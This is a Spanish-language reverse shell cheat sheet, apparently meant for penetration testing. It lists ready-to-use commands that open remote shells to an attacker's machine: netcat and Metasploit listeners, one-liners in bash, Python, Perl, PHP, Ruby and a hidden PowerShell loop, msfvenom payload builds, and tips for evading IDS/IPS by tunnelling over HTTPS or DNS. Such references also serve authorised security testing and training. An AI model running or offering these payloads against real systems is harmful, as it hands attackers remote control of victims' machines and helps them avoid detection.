# Reverse Shell Cheat Sheet

## 1. Concepto Rápido
- **Reverse Shell:** La víctima inicia conexión hacia el atacante y le envía su shell.
- Ideal cuando la víctima está detrás de **NAT** o firewall.
- Más usada que la bind shell en entornos reales.

---

## 2. Preparar el Listener (Atacante)
```bash
# Linux (Netcat tradicional)
nc -lvp 4444

# Netcat Nmap (ncat)
ncat -lvp 4444

# Metasploit multi/handler
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <IP_atacante>
set LPORT 4444
exploit
```

---

## 3. Comandos Reverse Shell Linux → Linux
```bash
# Netcat (GNU)
nc <IP_atacante> 4444 -e /bin/bash

# Netcat sin -e (bash redirection)
rm /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <IP_atacante> 4444 > /tmp/f

# Bash pura
bash -i >& /dev/tcp/<IP_atacante>/4444 0>&1

# Python
python3 -c 'import socket,os,pty; s=socket.socket(); s.connect(("<IP_atacante>",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); pty.spawn("/bin/bash")'

# Perl
perl -e 'use Socket;$i="<IP_atacante>";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
```

---

## 4. Comandos Reverse Shell Windows → Linux
```bash
# Netcat (Windows)
nc.exe <IP_atacante> 4444 -e cmd.exe

# PowerShell (One-liner)
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "New-Object System.Net.Sockets.TCPClient('<IP_atacante>',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"

# PowerShell Base64
powershell -EncodedCommand <cadena_base64>

# Con msfvenom
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP_atacante> LPORT=4444 -f exe > reverse.exe
```

---

## 5. Payloads Comunes con msfvenom
```bash
# Windows x86 Meterpreter Reverse TCP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP_atacante> LPORT=4444 -f exe > reverse.exe

# Windows x64
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP_atacante> LPORT=4444 -f exe > reverse64.exe

# Linux x86
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP_atacante> LPORT=4444 -f elf > reverse.elf

# PHP reverse shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP_atacante> LPORT=4444 -f raw > shell.php
```

---

## 6. Reverse Shell por Lenguajes
| Lenguaje   | Comando/Código rápido |
|------------|-----------------------|
| Bash       | `bash -i >& /dev/tcp/IP/PORT 0>&1` |
| Python     | Script socket + pty   |
| Perl       | Script con `Socket`   |
| PHP        | `php -r '$sock=fsockopen("IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'` |
| PowerShell | TCPClient loop        |
| Ruby       | `ruby -rsocket -e 'f=TCPSocket.open("IP",PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'` |

---

## 7. Consejos Prácticos
- Si la shell es muy básica, mejorarla con:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
CTRL+Z
stty raw -echo; fg
export TERM=xterm
```
- Cambiar puertos si hay filtrado.
- Encapsular en HTTPS o DNS si hay IDS/IPS.

---

## 8. Resumen Rápido
**Listener (atacante):**
```bash
nc -lvp 4444
```
**Víctima (ejecuta payload):**
```bash
nc <IP_atacante> 4444 -e /bin/bash
```
**Uso en Metasploit:**
```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <IP_atacante>
set LPORT 4444
exploit
```
